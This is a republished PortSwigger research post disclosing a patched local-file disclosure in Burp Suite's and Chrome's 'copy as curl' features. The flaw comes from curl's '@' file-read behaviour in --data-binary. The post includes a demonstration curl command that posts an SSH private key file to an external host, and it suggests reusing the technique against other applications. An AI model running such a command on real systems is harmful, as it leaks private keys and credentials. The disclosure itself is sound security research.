---
title: The curl quirk that exposed Burp Suite &amp; Google Chrome
url: https://buaq.net/go-155744.html
source: unSafe.sh - 不安全
date: 2023-03-29
fetch_date: 2025-10-04T10:59:03.788106
---

# The curl quirk that exposed Burp Suite &amp; Google Chrome

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/54d9e6d2bb81413af9c61f22bf59b8a5.jpg)

The curl quirk that exposed Burp Suite &amp; Google Chrome

Published: 28 March 2023 at 13:13 UTC
*2023-3-28 21:13:51
Author: [portswigger.net(查看原文)](/jump-155744.htm)
阅读量:49
收藏*

---

![James Kettle](https://portswigger.net/content/images/profiles/callout_james_kettle_112px.png)

* **Published:** 28 March 2023 at 13:13 UTC
* **Updated:** 28 March 2023 at 13:13 UTC

![A laptop using a fishing line to pick someone's pocket](https://portswigger.net/cms/images/56/e3/f99d-article-curl_quirk_blog-article.png "PortSwigger")

In this post, we'll explore a little-known feature in curl that led to a local-file disclosure vulnerability in both [Burp Suite Pro](https://portswigger.net/burp/pro), and Google Chrome. We patched Burp Suite a while back, but suspect the technique might be useful to exploit other applications that have a 'copy as curl' feature, or invoke curl from the command line. This vulnerability was privately reported to our [bug bounty program](https://hackerone.com/portswigger) by [Paul Mutton](https://twitter.com/paulmutton), and he's kindly agreed to let us publish this writeup.

Burp Suite users often craft complex HTTP requests to demonstrate vulnerabilities in websites. To make sharing these proof-of-concept exploits with other people easier, we have a `Copy as curl command` feature which generates a curl command that replicates a request inside Burp Suite.

For example, given the following request:

`POST / HTTP/1.1
Host: portswigger.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar`

If you click `Copy as curl command`, Burp Suite will generate the following command and copy it to the clipboard:

`curl -i -s -k
 -X $'POST' \
 -H $'Host: portswigger.net' \
 -H $'Content-Type: application/x-www-form-urlencoded' \
 -H $'Content-Length: 7' \
 --data-binary $'foo=bar' \
 $'https://portswigger.net/'`

You can then paste this command into the terminal to re-issue the request outside Burp Suite. We're careful about escaping this data to avoid users being exploited by malicious requests injecting extra shell commands, or arbitrary curl arguments.

Unfortunately, there's a subtler problem. Can you see it?

As usual, the answer lies in the [friendly manual](https://curl.se/docs/manpage.html#--data-binary):

`--data-binary <data>

This posts data exactly as specified with no extra processing whatsoever.

If you start the data with the letter @, the rest should be a filename.`

So, this is safe:

`curl --data-binary '/home/albinowax/.ssh/id_rsa' --trace-ascii - https://02.rs/
=> Send data, 28 bytes (0x1c)
0000: /home/albinowax/.ssh/id_rsa`

And this is... not so safe:

`curl --data-binary '@/home/albinowax/.ssh/id_rsa' --trace-ascii - https://02.rs/
=> Send data, 662 bytes (0x296)
> -----BEGIN RSA PRIVATE KEY-----.b3BlbnNzaC1rZXktdjEA....`

(Not my real private key)

We patched this vulnerability in release 2020.5.1 by switching to the newer and safer but less-supported `--data-raw` flag if the request body starts with an @ symbol.

We were lucky in that exploiting this in Burp Suite required relatively heavy user-interaction - the attacker would have to induce a user to visit a malicious website, copy the crafted request as a curl command, and then execute it via the command line. If a website uses curl with an attacker-controlled request body, this could have a significantly higher impact, so it's definitely worth keeping an eye out for during [SSRF](https://portswigger.net/web-security/ssrf) testing. The @ file-read behaviour works with headers too, so it could be useful on sites that let you define a custom header.

Although this feature took us ([and Chrome](https://chromium.googlesource.com/devtools/devtools-frontend/%2B/d2663acda4ce90bc2b23e3569cbd21ad7df74593%5E%21/#F0)) by surprise, it is fully documented so we don't consider it to be a vulnerability in curl itself. It reminds me of [server-side template injection](https://portswigger.net/web-security/server-side-template-injection), where a sandbox escape can be as easy as reading a manual page everyone else overlooked.

Thanks again to Paul for sharing this cool technique.

Till next time!

[Back to all articles](https://portswigger.net/research/articles)

文章来源: https://portswigger.net/research/the-curl-quirk-that-exposed-burp-suite-amp-google-chrome
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)